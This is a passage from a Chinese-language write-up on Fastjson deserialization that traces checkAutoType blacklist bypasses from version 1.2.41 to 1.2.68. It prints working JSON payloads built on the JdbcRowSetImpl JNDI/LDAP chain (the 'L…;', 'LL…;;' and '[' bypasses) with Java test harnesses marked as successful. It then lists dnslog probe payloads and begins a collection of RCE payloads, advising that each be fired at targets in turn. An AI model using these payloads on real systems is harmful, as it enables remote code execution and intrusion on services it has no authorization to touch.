                }
                for (int i = 0; i  " + expectClass.getName());
                        }
                        return clazz;
                    }
                }
            }
            // 位置4，过了黑白名单，autoTypeSupport开启，就加载目标类
            if (autoTypeSupport || expectClass != null) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
            }
            if (clazz != null) {
                // ClassLoader、DataSource子类/子接口检测
                if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                        || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                        ) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
                if (expectClass != null) {
                    if (expectClass.isAssignableFrom(clazz)) {
                        return clazz;
                    } else {
                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }
                }
            }
            if (!autoTypeSupport) {
                throw new JSONException("autoType is not support. " + typeName);
            }
            return clazz;
        }
在上面做了四个位置标记，因为后面几次绕过也与这几处位置有关。这一次的绕过是走过了前面的1，2，3成功进入位置4加载目标类。位置4 loadclass如下：
去掉了className前后的`L`和`;`，形如`Lcom.lang.Thread;`这种表示方法和JVM中类的表示方法是类似的，fastjson对这种表示方式做了处理。而之前的黑名单检测都是startswith检测的，所以可给@type指定的类前后加上`L`和`;`来绕过黑名单检测。
这里用上面的JdbcRowSetImpl利用链：
    {
      "rand1": {
        "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
        "dataSourceName": "ldap://localhost:1389/Object",
        "autoCommit": true
      }
    }
测试（jdk8u102，fastjson 1.2.41）：
    package com.longofo.test;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    public class Test4 {
        public static void main(String[] args) {
            String payload = "{\"rand1\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/Object\",\"autoCommit\":true}}";
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            //JSON.parse(payload); 成功
            //JSON.parseObject(payload); 成功
            //JSON.parseObject(payload,Object.class); 成功
            //JSON.parseObject(payload, User.class); 成功
        }
    }
结果：
##### ver=1.2.42
在1.2.42对1.2.25~1.2.41的checkAutotype绕过进行了修复，将黑名单改成了十进制，对checkAutotype检测也做了相应变化：
黑名单改成了十进制，检测也进行了相应hash运算。不过和上面1.2.25中的检测过程还是一致的，只是把startswith这种检测换成了hash运算这种检测。对于1.2.25~1.2.41的checkAutotype绕过的修复，就是红框处，判断了className前后是不是`L`和`;`，如果是，就截取第二个字符和到倒数第二个字符。所以1.2.42版本的checkAutotype绕过就是前后双写`LL`和`;;`，截取之后过程就和1.2.25~1.2.41版本利用方式一样了。
用上面的JdbcRowSetImpl利用链：
    {
      "rand1": {
        "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
        "dataSourceName": "ldap://localhost:1389/Object",
        "autoCommit": true
      }
    }
测试（jdk8u102，fastjson 1.2.42）:
    package com.longofo.test;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    public class Test5 {
        public static void main(String[] args) {
            String payload = "{\"rand1\":{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://localhost:1389/Object\",\"autoCommit\":true}}";
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            //JSON.parse(payload); 成功
            //JSON.parseObject(payload); 成功
            //JSON.parseObject(payload,Object.class); 成功
            //JSON.parseObject(payload, User.class); 成功
        }
    }
结果：
##### ver=1.2.43
1.2.43对于1.2.42的绕过修复方式：
在第一个if条件之下（`L`开头，`;`结尾），又加了一个以`LL`开头的条件，如果第一个条件满足并且以`LL`开头，直接抛异常。所以这种修复方式没法在绕过了。但是上面的loadclass除了`L`和`;`做了特殊处理外，`[`也被特殊处理了，又再次绕过了checkAutoType：
用上面的JdbcRowSetImpl利用链：
    {"rand1":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true]}}
测试（jdk8u102，fastjson 1.2.43）:
    package com.longofo.test;
    import com.alibaba.fastjson.JSON;
    import com.alibaba.fastjson.parser.ParserConfig;
    public class Test6 {
        public static void main(String[] args) {
            String payload = "{\"rand1\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true]}}";
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    //        JSON.parse(payload); 成功
            //JSON.parseObject(payload); 成功
            //JSON.parseObject(payload,Object.class); 成功
            JSON.parseObject(payload, User.class);
        }
    }
结果：
##### ver=1.2.44
1.2.44版本修复了1.2.43绕过，处理了`[`：
删除了之前的`L`开头、`;`结尾、`LL`开头的判断，改成了`[`开头就抛异常，`;`结尾也抛异常，所以这样写之前的几次绕过都修复了。
##### `ver>=1.2.45&ver=1.2.48&ver<=1.2.68
在1.2.48修复了1.2.47的绕过，在MiscCodec，处理Class类的地方，设置了cache为false：
在1.2.48到最新版本1.2.68之间，都是增加黑名单类。
##### ver=1.2.68
1.2.68是目前最新版，在1.2.68引入了safemode，打开safemode时，@type这个specialkey完全无用，无论白名单和黑名单，都不支持autoType了。
在这个版本中，除了增加黑名单，还减掉一个黑名单：
这个减掉的黑名单，不知道有师傅跑出来没，是个包名还是类名，然后能不能用于恶意利用，反正有点奇怪。
#### 探测Fastjson
比较常用的探测Fastjson是用dnslog方式，探测到了再用RCE
Payload去一个一个打。同事说让搞个能回显的放扫描器扫描，不过目标容器/框架不一样，回显方式也会不一样，这有点为难了...，还是用dnslog吧。
##### dnslog探测
目前fastjson探测比较通用的就是dnslog方式去探测，其中Inet4Address、Inet6Address直到1.2.67都可用。下面给出一些看到的payload（结合了上面的rand:{}这种方式，比较通用些）：
    {"rand1":{"@type":"java.net.InetAddress","val":"http://dnslog"}}
    {"rand2":{"@type":"java.net.Inet4Address","val":"http://dnslog"}}
    {"rand3":{"@type":"java.net.Inet6Address","val":"http://dnslog"}}
    {"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}}
    {"rand5":{"@type":"java.net.URL","val":"http://dnslog"}}
    一些畸形payload，不过依然可以触发dnslog：
    {"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}
    {"rand7":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}
    {"rand8":Set[{"@type":"java.net.URL","val":"http://dnslog"}
    {"rand9":{"@type":"java.net.URL","val":"http://dnslog"}:0
#### 一些RCE Payload
之前没有收集关于fastjson的payload，没有去跑jar包....，下面列出了网络上流传的payload以及从marshalsec中扣了一些并改造成适用于fastjson的payload，每个payload适用的jdk版本、fastjson版本就不一一测试写了，这一通测下来都不知道要花多少时间，实际利用基本无法知道版本、autotype开了没、用户咋配置的、用户自己设置又加了黑名单/白名单没，所以将构造的Payload一一过去打就行了，基础payload：
    payload1:
    {
      "rand1": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://localhost:1389/Object",
        "autoCommit": true